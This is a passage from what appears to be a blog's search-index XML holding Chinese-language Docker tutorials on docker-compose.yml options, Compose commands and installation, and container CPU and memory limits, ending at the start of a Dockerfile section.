class="line">environment:</span><br><span class="line">    - RACK_ENV&#x3D;development</span><br><span class="line">    - SHOW&#x3D;ture</span><br></pre></td></tr></table></figure><h6 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a>env_file</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">从文件中获取环境变量，可以指定一个文件路径或路径列表，其优先级低于 environment 指定的环境变量</span><br><span class="line">env_file: .env</span><br><span class="line">---------------</span><br><span class="line">env_file:</span><br><span class="line">    - .&#x2F;common.env</span><br></pre></td></tr></table></figure><h6 id="expose"><a href="#expose" class="headerlink" title="expose"></a>expose</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">暴露端口，只将端口暴露给连接的服务，而不暴露给主机</span><br><span class="line">expose:</span><br><span class="line">    - &quot;3000&quot;</span><br><span class="line">    - &quot;8000&quot;</span><br></pre></td></tr></table></figure><h6 id="image"><a href="#image" class="headerlink" title="image"></a>image</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指定服务所使用的镜像或镜像 ID。如果镜像在本地不存在，Compose 将会尝试拉取这个镜像。</span><br><span class="line">image: java</span><br></pre></td></tr></table></figure><h6 id="network-mode"><a href="#network-mode" class="headerlink" title="network_mode"></a>network_mode</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">设置网络模式</span><br><span class="line">network_mode: &quot;bridge&quot;</span><br><span class="line">network_mode: &quot;host&quot;</span><br><span class="line">network_mode: &quot;none&quot;</span><br><span class="line">network_mode: &quot;service:[service name]&quot;</span><br><span class="line">network_mode: &quot;container:[container name&#x2F;id]&quot;</span><br></pre></td></tr></table></figure><h6 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对外暴露的端口定义，和 expose 对应</span><br><span class="line">ports:   # 暴露端口信息  - &quot;宿主机端口:容器暴露端口&quot;</span><br><span class="line">- &quot;8763:8763&quot;</span><br><span class="line">- &quot;8763:8763&quot;</span><br></pre></td></tr></table></figure><h6 id="links"><a href="#links" class="headerlink" title="links"></a>links</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将指定容器连接到当前连接，可以设置别名，避免ip方式导致的容器重启动态改变的无法连接情况</span><br><span class="line">links:    # 指定服务名称:别名</span><br><span class="line">    - docker-compose-eureka-server:compose-eureka</span><br></pre></td></tr></table></figure><h6 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据卷所挂载路径设置。可以设置为宿主机路径(HOST:CONTAINER)或者数据卷名称(VOLUME:CONTAINER)，并且可以设置访问模式 （HOST:CONTAINER:ro）。</span><br><span class="line">volumes:</span><br><span class="line">      - &#x2F;app&#x2F;skywalking&#x2F;elasticsearch&#x2F;data:&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;data:rw</span><br><span class="line">      - conf&#x2F;elasticsearch.yml:&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;config&#x2F;elasticsearch.yml</span><br></pre></td></tr></table></figure><h6 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">日志输出信息</span><br><span class="line">--no-color          单色输出，不显示其他颜.</span><br><span class="line">-f, --follow        跟踪日志输出，就是可以实时查看日志</span><br><span class="line">-t, --timestamps    显示时间戳</span><br><span class="line">--tail              从日志的结尾显示，--tail&#x3D;200</span><br></pre></td></tr></table></figure><h6 id="ulimits"><a href="#ulimits" class="headerlink" title="ulimits"></a>ulimits</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">指定容器的 ulimits 限制值。</span><br><span class="line">例如，指定最大进程数为 65535，指定文件句柄数为 20000（软限制，应用可以随时修改，不能超过硬限制） </span><br><span class="line">和 40000（系统硬限制，只能 root 用户提高）。</span><br><span class="line"></span><br><span class="line">ulimits:</span><br><span class="line">   nproc: 65535</span><br><span class="line">   nofile:</span><br><span class="line">     soft: 20000</span><br><span class="line">     hard: 40000</span><br></pre></td></tr></table></figure><h6 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">解决容器的依赖、启动先后的问题。以下例子中会先启动 redis mysql 再启动 web</span><br><span class="line"></span><br><span class="line">version: &#39;3&#39;</span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    build: .</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">      - redis      </span><br><span class="line">  redis:</span><br><span class="line">    image: redis    </span><br><span class="line">  db:</span><br><span class="line">    image: mysql</span><br></pre></td></tr></table></figure><h6 id="restart"><a href="#restart" class="headerlink" title="restart"></a>restart</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">指定容器退出后的重启策略为始终重启。</span><br><span class="line">该命令对保持服务始终运行十分有效，在生产环境中推荐配置为 always 或者 unless-stopped。</span><br><span class="line"></span><br><span class="line">restart: always</span><br></pre></td></tr></table></figure><h2 id="实战举例"><a href="#实战举例" class="headerlink" title="实战举例"></a>实战举例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;3.3&#39;</span><br><span class="line">services:</span><br><span class="line">  elasticsearch:</span><br><span class="line">    image: docker.elastic.co&#x2F;elasticsearch&#x2F;elasticsearch:6.8.5</span><br><span class="line">    container_name: elasticsearch</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - 9200:9200</span><br><span class="line">      - 9300:9300</span><br><span class="line">    environment:</span><br><span class="line">      discovery.type: single-node</span><br><span class="line">    ulimits:</span><br><span class="line">      memlock:</span><br><span class="line">        soft: -1</span><br><span class="line">        hard: -1</span><br><span class="line">  oap:</span><br><span class="line">    image: skywalking&#x2F;oap</span><br><span class="line">    container_name: oap</span><br><span class="line">    depends_on:</span><br><span class="line">      - elasticsearch</span><br><span class="line">    links:</span><br><span class="line">      - elasticsearch</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - 11800:11800</span><br><span class="line">      - 12800:12800</span><br><span class="line">    environment:</span><br><span class="line">      SW_STORAGE: elasticsearch</span><br><span class="line">      SW_STORAGE_ES_CLUSTER_NODES: elasticsearch:9200</span><br><span class="line">  ui:</span><br><span class="line">    image: skywalking&#x2F;ui</span><br><span class="line">    container_name: ui</span><br><span class="line">    depends_on:</span><br><span class="line">      - oap</span><br><span class="line">    links:</span><br><span class="line">      - oap</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - 8080:8080</span><br><span class="line">    environment:</span><br><span class="line">      SW_OAP_ADDRESS: oap:12800</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How To Use Docker Compose</title>
      <link href="/2019/09/15/How-To-Use-Docker-Compose/"/>
      <url>/2019/09/15/How-To-Use-Docker-Compose/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="命令选项"><a href="#命令选项" class="headerlink" title="命令选项"></a>命令选项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-f, --file FILE 指定使用的 Compose 模板文件，默认为 docker-compose.yml，可以多次指定。</span><br><span class="line">-p, --project-name NAME 指定项目名称，默认将使用所在目录名称作为项目名。</span><br><span class="line">–x-networking 使用 Docker 的可拔插网络后端特性</span><br><span class="line">–x-network-driver DRIVER 指定网络后端的驱动，默认为 bridge</span><br><span class="line">–verbose 输出更多调试信息。</span><br><span class="line">-v, --version 打印版本并退出。</span><br></pre></td></tr></table></figure><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 验证 Compose 文件格式是否正确，若正确则显示配置，若格式错误显示错误原因。如：</span><br><span class="line">docker-compose -f skywalking.yml config</span><br><span class="line"># 此命令不会执行真正的操作，而是显示 docker-compose 程序解析到的配置文件内容</span><br></pre></td></tr></table></figure><h3 id="images"><a href="#images" class="headerlink" title="images"></a>images</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 列出 Compose 文件中包含的镜像。如</span><br><span class="line">docker-compose -f skywalking.yml images</span><br></pre></td></tr></table></figure><h3 id="列出所有运行容器"><a href="#列出所有运行容器" class="headerlink" title="列出所有运行容器"></a>列出所有运行容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><h3 id="查看服务日志输出"><a href="#查看服务日志输出" class="headerlink" title="查看服务日志输出"></a>查看服务日志输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs</span><br></pre></td></tr></table></figure><h3 id="打印绑定的公共端口"><a href="#打印绑定的公共端口" class="headerlink" title="打印绑定的公共端口"></a>打印绑定的公共端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下面命令可以输出 eureka 服务 8761 端口所绑定的公共端口</span><br><span class="line">docker-compose port eureka 8761</span><br></pre></td></tr></table></figure><h3 id="构建或者重新构建服务"><a href="#构建或者重新构建服务" class="headerlink" title="构建或者重新构建服务"></a>构建或者重新构建服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 构建（重新构建）项目中的服务容器。如：</span><br><span class="line">docker-compose -f skywalking.yml build</span><br><span class="line"># 一般搭配自定义镜像，比如编写的Dockfile，功能类似于docker build .</span><br></pre></td></tr></table></figure><h3 id="启动指定服务已存在的容器"><a href="#启动指定服务已存在的容器" class="headerlink" title="启动指定服务已存在的容器"></a>启动指定服务已存在的容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose start eureka</span><br></pre></td></tr></table></figure><h3 id="停止已运行的服务的容器"><a href="#停止已运行的服务的容器" class="headerlink" title="停止已运行的服务的容器"></a>停止已运行的服务的容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose stop eureka</span><br></pre></td></tr></table></figure><h3 id="删除指定服务的容器"><a href="#删除指定服务的容器" class="headerlink" title="删除指定服务的容器"></a>删除指定服务的容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose rm eureka</span><br></pre></td></tr></table></figure><h3 id="构建、启动、停止容器"><a href="#构建、启动、停止容器" class="headerlink" title="构建、启动、停止容器"></a>构建、启动、停止容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line">默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，</span><br><span class="line">然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容。</span><br><span class="line">如果用户不希望容器被停止并重新创建，可以使用 docker-compose up --no-recreate。</span><br><span class="line">这样将只会启动处于停止状态的容器，而忽略已经运行的服务。</span><br><span class="line">如果用户只想重新部署某个服务，可以使用 docker-compose up --no-deps -d &lt;SERVICE_NAME&gt; 来重新创建服务并后台停止旧服务，启动新服务，并不会影响到其所依赖的服务。</span><br><span class="line">此命令有如下选项：</span><br><span class="line">1. -d 在后台运行服务容器。</span><br><span class="line">2. --no-color 不使用颜色来区分不同的服务的控制台输出。</span><br><span class="line">3. --no-deps 不启动服务所链接的容器。</span><br><span class="line">4. --force-recreate 强制重新创建容器，不能与 --no-recreate 同时使用。</span><br><span class="line">5. --no-recreate 如果容器已经存在了，则不重新创建，不能与 --force-recreate 同时使用。</span><br><span class="line">6. --no-build 不自动构建缺失的服务镜像。</span><br><span class="line">7. -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。</span><br></pre></td></tr></table></figure><h3 id="通过发送-SIGKILL-信号来停止指定服务的容器"><a href="#通过发送-SIGKILL-信号来停止指定服务的容器" class="headerlink" title="通过发送 SIGKILL 信号来停止指定服务的容器"></a>通过发送 SIGKILL 信号来停止指定服务的容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose kill eureka</span><br></pre></td></tr></table></figure><h3 id="下载服务镜像：pull"><a href="#下载服务镜像：pull" class="headerlink" title="下载服务镜像：pull"></a>下载服务镜像：pull</h3><h3 id="设置指定服务运行容器的个数"><a href="#设置指定服务运行容器的个数" class="headerlink" title="设置指定服务运行容器的个数"></a>设置指定服务运行容器的个数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 以 service&#x3D;num 形式指定</span><br><span class="line">docker-compose scale user&#x3D;3 movie&#x3D;3</span><br></pre></td></tr></table></figure><h3 id="在一个服务上执行一个命令"><a href="#在一个服务上执行一个命令" class="headerlink" title="在一个服务上执行一个命令"></a>在一个服务上执行一个命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose run web bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Compose Introduction</title>
      <link href="/2019/09/15/Docker-Compose-Introduction/"/>
      <url>/2019/09/15/Docker-Compose-Introduction/</url>
      
        <content type="html"><![CDATA[<h2 id="DockerCompose-概念"><a href="#DockerCompose-概念" class="headerlink" title="DockerCompose 概念"></a>DockerCompose 概念</h2><p>Compose有2个重要的概念：</p><ul><li>项目（Project）：由一组关联的应用容器组成的一个完整业务单元，在 docker-compose.yml 文件中定义。</li><li>服务（Service）：一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。<h3 id="工程、服务、容器"><a href="#工程、服务、容器" class="headerlink" title="工程、服务、容器"></a>工程、服务、容器</h3><blockquote><p>Docker Compose 将所管理的容器分为三层，分别是工程（project）、服务（service）、容器（container）</p></blockquote></li></ul><p>Docker Compose 运行目录下的所有文件（docker-compose.yml）组成一个工程,一个工程包含多个服务，每个服务中定义了容器运行的镜像、参数、依赖，一个服务可包括多个容器实例</p><h2 id="安装-Docker-Compose"><a href="#安装-Docker-Compose" class="headerlink" title="安装 Docker-Compose"></a>安装 Docker-Compose</h2><h3 id="github-安装"><a href="#github-安装" class="headerlink" title="github 安装"></a>github 安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自动下载适应版本的 Compose，并为安装脚本添加执行权限</span><br><span class="line">curl -L https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.25.0&#x2F;docker-compose-$(uname -s)-$(uname -m) -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br><span class="line">chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure><h3 id="pip-安装"><a href="#pip-安装" class="headerlink" title="pip 安装"></a>pip 安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br><span class="line"># 查看是否安装成功</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure><h3 id="安装补全插件"><a href="#安装补全插件" class="headerlink" title="安装补全插件"></a>安装补全插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;docker&#x2F;compose&#x2F;1.25.0&#x2F;contrib&#x2F;completion&#x2F;bash&#x2F;docker-compose &gt; &#x2F;etc&#x2F;bash_completion.d&#x2F;docker-compose</span><br></pre></td></tr></table></figure><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 二进制卸载</span><br><span class="line">rm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br><span class="line"># pip卸载</span><br><span class="line">pip uninstall docker-compose</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Manage Docker Container</title>
      <link href="/2019/09/12/Manage-Docker-Container/"/>
      <url>/2019/09/12/Manage-Docker-Container/</url>
      
        <content type="html"><![CDATA[<h2 id="容器资源管理"><a href="#容器资源管理" class="headerlink" title="容器资源管理"></a>容器资源管理</h2><h3 id="资源类型"><a href="#资源类型" class="headerlink" title="资源类型"></a>资源类型</h3><p>当我们启动一个容器的时候，它可以使用一些系统资源，这与我们在物理机上启动程序基本是一致的。比如主要的几类：</p><ul><li>CPU</li><li>内存</li><li>网络</li><li>I/O</li><li>GPU<h3 id="查看容器占用资源"><a href="#查看容器占用资源" class="headerlink" title="查看容器占用资源"></a>查看容器占用资源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker stats 容器id</span><br><span class="line">或者稍微简化的命令 docker top 容器id</span><br><span class="line"># docker top $(docker ps -ql) -o pid,c,cmd  </span><br><span class="line"></span><br><span class="line"># 可加参数</span><br><span class="line">--no-stream  # docker stats 命令默认是一个持续的动态流式输出（每秒一次），给它传递 --no-stream 参数后，它就只输出一次便会退出了。</span><br><span class="line"></span><br><span class="line"># Container ID：容器的 ID，也是一个容器生命周期内不会变更的信息。</span><br><span class="line"># Name：容器的名称，如果没有手动使用 --name 参数指定，则 Docker 会随机生成一个，运行过程中也可以通过命令修改。</span><br><span class="line"># CPU %：容器正在使用的 CPU 资源的百分比，下面会详细说。</span><br><span class="line"># Mem Usage&#x2F;Limit：当前内存的使用及容器可用的最大内存。</span><br><span class="line"># Mem %：容器正在使用的内存资源的百分比。</span><br><span class="line"># Net I&#x2F;O：容器通过其网络接口发送和接受到的数据量。</span><br><span class="line"># Block I&#x2F;O：容器通过块设备读取和写入的数据量。</span><br><span class="line"># Pids：容器创建的进程或线程数。</span><br></pre></td></tr></table></figure><h3 id="管理容器的-CPU-资源"><a href="#管理容器的-CPU-资源" class="headerlink" title="管理容器的 CPU 资源"></a>管理容器的 CPU 资源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run --help |grep CPU</span><br><span class="line"></span><br><span class="line"># 1. 限制容器占用cpu资源，默认无限制</span><br><span class="line">docker update --cpus &quot;0.5&quot; $(docker ps -ql) # 限制容器只可以使用 0.5 CPU</span><br><span class="line"># 如果是多核，比如八核，则最多可以分配8个cpu，cpu占用率也会显示800%</span><br><span class="line"></span><br><span class="line"># 2. 指定可使用 CPU 核</span><br><span class="line"># 可以使用 --cpuset-cpus 来指定分配可使用的 CPU 核，指定 0 表示使用第一个 CPU 核。</span><br><span class="line">docker update --cpus &quot;1.5&quot; --cpuset-cpus 0  $(docker ps -ql)</span><br></pre></td></tr></table></figure><h3 id="管理容器的-内存-资源"><a href="#管理容器的-内存-资源" class="headerlink" title="管理容器的 内存 资源"></a>管理容器的 内存 资源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">docker run --help |egrep &#39;memory|oom&#39;</span><br><span class="line"></span><br><span class="line"># OOM——Out Of Memory</span><br><span class="line"># 当内核检测到没有足够的内存来运行系统的某些功能时候，就会触发 OOM 异常，并且会使用 OOM Killer 来杀掉一些进程，腾出空间以保障系统的正常运行。</span><br><span class="line"># 内核中 OOM Killer 的代码，在 torvalds&#x2F;linux&#x2F;mm&#x2F;oom_kill.c 可直接看到</span><br><span class="line"># Docker 在启动的时候默认设置了一个 -500 的 oom_score_adj 以尽可能地避免 Docker 进程本身被 OOM Killer 给杀掉。</span><br><span class="line"># 如果我们想让某个容器，尽可能地不要被 OOM Killer 杀掉，那我们可以给它传递 --oom-score-adj 配置一个比较低的数值。</span><br><span class="line"># 但是注意：不要通过 --oom-kill-disable 禁用掉 OOM Killer，或者给容器设置低于 dockerd 进程的 oom_score_adj 值，这可能会导致某些情况下系统的不稳定。</span><br><span class="line"></span><br><span class="line"># 限制内存</span><br><span class="line">docker run --rm -it --memory 10m alpine # --memory 10m 限制其可使用的内存为 10 m</span><br><span class="line"># 查看限制大小</span><br><span class="line"># docker stats查询</span><br><span class="line">docker stats --no-stream $(docker ps -ql)</span><br><span class="line"># 在容器内执行</span><br><span class="line">cat &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;memory.limit_in_bytes </span><br><span class="line">&gt;&gt;&gt; 10485760</span><br><span class="line"># 在宿主机上执行</span><br><span class="line">cat &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;docker-$(docker inspect --format &#39;&#123;&#123; .Id&#125;&#125;&#39; $(docker ps -ql)).scope&#x2F;memory.limit_in_bytes</span><br><span class="line">&gt;&gt;&gt; 10485760</span><br><span class="line"></span><br><span class="line"># 更新容器可使用的内存</span><br><span class="line">docker update --memory 20m $(docker ps -ql)</span><br></pre></td></tr></table></figure><h4 id="内存限制参数的特定行为"><a href="#内存限制参数的特定行为" class="headerlink" title="内存限制参数的特定行为"></a>内存限制参数的特定行为</h4><blockquote><p>这里的特定参数行为，主要是指我们前面使用的 –memory 和未介绍过的 –memory-swap 这两个参数。</p></blockquote></li></ul><ol><li>–memory 用于限制内存使用量，而 –memory-swap 则表示内存和 Swap 的总和。</li></ol><p>–memory-swap 始终应该大于等于 –memory （毕竟 Swap 最小也只能是 0 ）。<br>2. 如果只指定了 –memory 则最终 –memory-swap 将会设置为 –memory 的两倍。也就是说，在只传递 –memory 的情况下，容器只能使用与 –memory 相同大小的 Swap。<br>如果创建容器的时候 –memory 10，那么直接对容器update扩大至 20m 的时候能成功，而扩大到 100m 的时候会出错，在上述场景中只指定了 –memory 为 10m，所以 –memory-swap 就默认被设置成了 20m。<br>3. 如果 –memory-swap 和 –memory 设置了相同值，则表示不使用 Swap。<br>4. 如果 –memory-swap 设置为 -1 则表示不对容器使用的 Swap 进行限制。<br>5. 如果设置了 –memory-swap 参数，则必须设置 –memory 参数。</p>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DockerFile</title>
      <link href="/2019/08/12/DockerFile/"/>
      <url>/2019/08/12/DockerFile/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Dockerfile的本质就是由一系列顺序编排的命令和参数组成的脚本，并利用它把我们需要的应用制成一个镜像文件</p></blockquote><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>1、对于开发人员：可以为开发团队提供完全一致的开发环境；<br>2、对于测试人员：可以直接用开发所制成的镜像或者通过Dockerfile文件构建一个新的镜像开始工作了；<br>3、对于运维人员：在部署时，可以实现应用的无缝移植。</p><h2 id="dockerignore"><a href="#dockerignore" class="headerlink" title=".dockerignore"></a>.dockerignore</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.git</span><br><span class="line">node_modules</span><br><span class="line">npm-debug.log</span><br><span class="line"># 上面代码表示，这三个路径要排除，不要打包进入 image 文件。如果没有路径要排除，这个文件可以不新建。</span><br></pre></td></tr></table></figure><h2 id="创建指令"><a href="#创建指令" class="headerlink" title="创建指令"></a>创建指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL | -</span><br><span class="line"></span><br><span class="line">--build-arg&#x3D;[] :设置镜像创建时的变量；</span><br><span class="line">--cpu-shares :设置 cpu 使用权重；</span><br><span class="line">--cpu-period :限制 CPU CFS周期；</span><br><span class="line">--cpu-quota :限制 CPU CFS配额；</span><br><span class="line">--cpuset-cpus :指定使用的CPU id；</span><br><span class="line">--cpuset-mems :指定使用的内存 id；</span><br><span class="line">--disable-content-trust 